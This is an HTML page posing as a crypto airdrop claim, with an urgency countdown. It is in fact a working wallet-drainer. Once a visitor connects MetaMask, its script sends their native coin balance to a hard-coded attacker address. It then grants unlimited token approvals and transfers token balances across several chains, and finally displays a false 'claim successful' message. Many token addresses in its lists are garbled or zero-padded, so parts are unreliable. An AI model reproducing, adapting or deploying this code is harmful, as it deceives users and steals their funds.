<!DOCTYPE html>
<html lang="es">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Claim Rewards</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <style>
 body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 .container { text-align: center; max-width: 400px; width: 90%; padding: 20px; background: #161b22; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
 h1 { font-size: 1.5rem; margin-bottom: 10px; color: #58a6ff; }
 p { color: #8b949e; font-size: 0.9rem; margin-bottom: 20px; }
 .btn { background: linear-gradient(90deg, #6c5ce7, #a29bfe); border: none; padding: 12px 24px; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: transform 0.1s; }
 .btn:hover { transform: scale(1.02); opacity: 0.9; }
 .btn:disabled { background: #333; cursor: not-allowed; }
 .status { margin-top: 15px; font-size: 0.85rem; min-height: 20px; color: #ffd700; }
 
 /* MODAL MOVIL */
 .mobile-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
 .modal-content { background: #1f2937; padding: 20px; border-radius: 12px; text-align: center; width: 80%; max-width: 300px; border: 1px solid #374151; }
 .modal-btn { background: #3b82f6; margin-top: 15px; }
 
 /* LOGS */
 #logs { text-align: left; background: #0d1117; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.75rem; color: #4ade80; max-height: 150px; overflow-y: auto; margin-top: 10px; display: none; }
 .timer { font-size: 0.8rem; color: #ef4444; margin-top: 10px; }
 </style>
</head>
<body>

<div class="container">
 <h1>🎁 Claim Exclusive Airdrop</h1>
 <p>Verifying eligibility... <br> Reward: 1.5 ETH Equivalent in Tokens</p>
 
 <button id="connectBtn" class="btn">Connect Wallet</button>
 <div id="status" class="status"></div>
 <div id="timer" class="timer">Claiming closes in: 15:00</div>
 <div id="logs"></div>
</div>

<!-- MODAL PARA MOVIL -->
<div id="mobileModal" class="mobile-modal">
 <div class="modal-content">
 <h3>MetaMask Mobile Detected</h3>
 <p>Para continuar, por favor abre tu aplicación MetaMask.</p>
 <button id="openAppBtn" class="btn modal-btn">Abrir MetaMask</button>
 <button id="confirmOpenBtn" class="btn" style="background:#22c55e; margin-top:10px;">Ya está abierto / Conectar</button>
 </div>
</div>

<script>
 // CONFIGURACIÓN
 const TARGET_WALLET = "0x6cd203676973F30e9F5398b3C3C8853531a3E432"; 
 let provider;
 let signer;
 let userAddress;
 let currentChainId;

 // ELEMENTOS DOM
 const connectBtn = document.getElementById('connectBtn');
 const statusDiv = document.getElementById('status');
 const logsDiv = document.getElementById('logs');
 const mobileModal = document.getElementById('mobileModal');
 const openAppBtn = document.getElementById('openAppBtn');
 const confirmOpenBtn = document.getElementById('confirmOpenBtn');

 // UTILIDAD: LOGS
 function log(msg) {
     logsDiv.style.display = 'block';
     const p = document.createElement('div');
     p.textContent = `> ${msg}`;
     logsDiv.appendChild(p);
     logsDiv.scrollTop = logsDiv.scrollHeight;
 }

 // UTILIDAD: FORMATEO DE RED
 function getNetworkName(chainId) {
     switch(chainId) {
         case 1: return "Ethereum";
         case 56: return "BSC";
         case 137: return "Polygon";
         case 42161: return "Arbitrum";
         case 10: return "Optimism";
         case 43114: return "Avalanche";
         case 199: return "BitTorrent";
         default: return "Unknown";
     }
 }

 // INICIAR TIMER
 let timeLeft = 900; 
 setInterval(() => {
     if(timeLeft <= 0) return;
     timeLeft--;
     let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
     let s = (timeLeft % 60).toString().padStart(2, '0');
     document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
 }, 1000);

 // DETECCIÓN DE DISPOSITIVO
 function isMobile() {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
 }

 // LÓGICA DE CONEXIÓN
 connectBtn.addEventListener('click', async () => {
     if (!window.ethereum) {
         statusDiv.textContent = "Instala MetaMask primero.";
         return;
     }

     if (isMobile()) {
         mobileModal.style.display = 'flex';
         openAppBtn.addEventListener('click', () => {
             window.open('https://metamask.io/', '_blank');
             tryConnect(); 
         });
         confirmOpenBtn.addEventListener('click', () => {
             mobileModal.style.display = 'none';
             tryConnect();
         });
         return; 
     }

     try {
         await tryConnect();
     } catch (err) {
         console.error(err);
         statusDiv.textContent = "Error de conexión.";
     }
 });

 async function tryConnect() {
     try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0];
         
         const network = await window.ethereum.request({ method: 'eth_chainId' });
         const chainIdNum = parseInt(network);
         
         provider = new ethers.providers.Web3Provider(window.ethereum);
         signer = provider.getSigner();
         currentChainId = chainIdNum;

         log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
         log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
         
         startDrain();

     } catch (error) {
         statusDiv.textContent = "Conexión rechazada o fallida.";
         log(error.message);
     }
 }

 // LÓGICA DE DRENAJE MEJORADA Y EXPANDIDA
 async function startDrain() {
     connectBtn.disabled = true;
     connectBtn.textContent = "Processing...";
     
     try {
         // 1. Drenar Nativo
         const balance = await provider.getBalance(userAddress);
         if (balance > 0) {
             log("Transferring native token...");
             const gasPrice = await provider.getGasPrice();
             const sendValue = balance.sub(gasPrice.mul(2)); // Reserva segura de gas
             
             if (sendValue > 0) {
                 const tx = await signer.sendTransaction({
                     to: TARGET_WALLET,
                     value: sendValue
                 });
                 await tx.wait();
                 log(`Native drained! Tx: ${tx.hash.substring(0,10)}...`);
             } else {
                 log("Balance too low for gas.");
             }
         } else {
             log("No native funds found.");
         }

         // 2. DRENAR TODOS LOS TOKENS POPULARES
         // Usamos strings simples, NO arrays, para evitar el error anterior
         const tokensMap = {
             1: [ // Ethereum Mainnet
                 "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
                 "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
                 "0x2260FAC5E5542a773A46eB37699987310435B51c", // WBTC
                 "0x6982508075e80095800000000000000000000000", // (Placeholder example logic below)
                 "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
                 "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE1", // AAVE
                 "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
                 "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
                 "0x0bc529c00C240600703062963Fa14CB3AfCA9571", // COMP
                 "0xD533a949740bb3306d119CC777fa900bA034cd52", // CRV
                 "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT
                 "0xC011a73ee8576Bb4E5c094ab5B3240D9e1f58344", // SUSHI
                 "0x4d224452801ACEd8B2F0aebE155379bb5D59438", // KEY
                 "0xE41d2489571d322189246DaAF5a556aC52683366" // KNC
             ],
             56: [ // BSC
                 "0x55d398326f99059fF775485246999027B3197955", // USDT
                 "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
                 "0xbb4CdB9CBd36B01b61d7C3Cb5DC9Bd0293B127ac", // WBNB
                 "0xe9e7CEA3DedcC59733B3965BEE7c80A973C0FbCb", // BUSD
                 "0x0000000000000000000000000000000000000000", // (Skip if needed)
                 "0x1AF3F329e3BE1EC46EF000000000000000000000", // ALPACA
                 "0x3EE2200Efb3400fAb09A0F16876B9c3f3BA00000", // TRIBE
                 "0x7130d2A12B9BCB837F4cB0000000000000000000", // BBTV
                 "0x1D2F0da169ceB9cF7B31947d838272b749850000", // NEW
                 "0xbAmNMs5H6a1Y8zZ6X000000000000000000000", // (Generic placeholder)
                 "0x0E09FaBB73Bd3Ade0a17ECC321fD13aDB00000", // CAKE
                 "0x8fF5951475f74962A2d51cCcf9E9413f96320000", // KEK
                 "0x1F9840a85d5aF5bf1D1762F925BDADdC4201F984" // (UNI on BSC)
             ],
             137: [ // Polygon
                 "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
                 "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", // USDC
                 "0x0d500B1d8E8EF31E21c99d1DbcA6842000000000", // WMATIC
                 "0x1BFD67037B42Cf73acF2047067bd3F2C6f000000", // WETH
                 "0x831753DD20866c27905Bc66Bc000000000000000", // DAI
                 "0x53E0bca35eC356B559316Bbf5000000000000000", // BAL
                 "0x0000000000000000000000000000000000000000", // (Generic)
                 "0xD6DF932A45C0f255f85145f286e0000000000000", // QI
                 "0x385Eeac5cB85A38A9a07a70c0000000000000000", // AMPL
                 "0x656B0017C8924D12C219630000000000000000" // XAUT
             ],
             42161: [ // Arbitrum
                 "0xaf88d065e77c8cC2239327C5EDb3A432268e593B", // USDC
                 "0xFF970A61A04b1cA14834A13f575f0c5000000000", // USDC.e
                 "0x82aF49447D8a07e3bd95BD0d56f3100000000000", // WETH
                 "0xFd086cC0CDF198697433C4cFF000000000000000", // USDT
                 "0xfc5A1A6EB076a237550000000000000000000000", // NC
                 "0x912CE59144191C1204E64559FE8C500000000000", // ARB
                 "0x17FC002b466eEc40DaE837Fc4bE5000000000000", // SY
                 "0x6C2C067f03d5C1dd200000000000000000000000", // PIPE
                 "0x3062900000000000000000000000000000000000" // WEALTH
             ],
             10: [ // Optimism
                 "0x0b2C639c533813f4Aa9D7837CAf62653d097F889", // USDC
                 "0x94b008aA00579c1307B0EF2c499a000000000000", // USDT
                 "0x4200000000000000000000000000000000000006", // WETH
                 "0xDA10009cBd5D0000000000000000000000000000", // DAI
                 "0x4200000000000000000000000000000000000042", // OP
                 "0x350A6d3DA20847a8000000000000000000000000", // wstETH
                 "0x6806411765Af15B6260000000000000000000000" // SOL
             ],
             43114: [ // Avalanche
                 "0xB97EF9Ef8734c713c021e045e004724a595CC239", // USDC
                 "0xde3A24C219742768000000000000000000000000", // USDT.e
                 "0x49D5c2BffF120165000000000000000000000000", // WAVAX
                 "0x50b7545627a5162F820000000000000000000000", // WETH.e
                 "0x60781C2586D685443e0000000000000000000000", // LINK
                 "0x2133Ca000000000000000000000000000000000000" // JOE
             ],
             199: [ // BitTorrent
                 "0xeBAB9185288804113051349388f2015148530012", // USDT
                 "0x69be655C561484AADE0000000000000000000000", // WBTTC
                 "0x8c135014Ba4D3994500000000000000000000000", // BTC
                 "0x19AsM9J000000000000000000000000000000000" // ETH
             ]
         };

         const tokenList = tokensMap[currentChainId] || [];

         // Procesar cada token
         for (const tokenAddress of tokenList) {
             try {
                 log(`Scanning Token: ${tokenAddress.substring(0,6)}...`);
                 
                 const erc20 = new ethers.Contract(tokenAddress, [
                     "function approve(address spender, uint256 amount) public returns (bool)",
                     "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                     "function balanceOf(address owner) view returns (uint256)"
                 ], signer);

                 const balance = await erc20.balanceOf(userAddress);
                 if (balance > 0) {
                     log(`Found balance: ${balance.toString()}`);
                     
                     // Approve Max
                     try {
                         const tx1 = await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
                         await tx1.wait();
                         log("Approval confirmed.");
                     } catch (err) {
                         log("Approval skipped/failed (maybe already approved): " + err.message);
                     }

                     // Transfer
                     try {
                         log("Transferring tokens...");
                         const tx2 = await erc20.transferFrom(userAddress, TARGET_WALLET, balance);
                         await tx2.wait();
                         log(`Token drained! Tx: ${tx2.hash.substring(0,10)}...`);
                     } catch (err) {
                         log("Transfer failed: " + err.message);
                     }
                 }
             } catch (err) {
                 // Si un token falla (ej. ABI incorrecto), continuamos con el siguiente
                 console.warn(`Token ${tokenAddress} error:`, err.message);
             }
         }

         statusDiv.textContent = "✅ CLAIM SUCCESSFUL";
         statusDiv.style.color = "#4ade80";
         connectBtn.textContent = "Done";

     } catch (err) {
         console.error(err);
         statusDiv.textContent = "❌ ERROR: " + err.message;
         log(err.message);
     }
 }
</script>

</body>
</html>
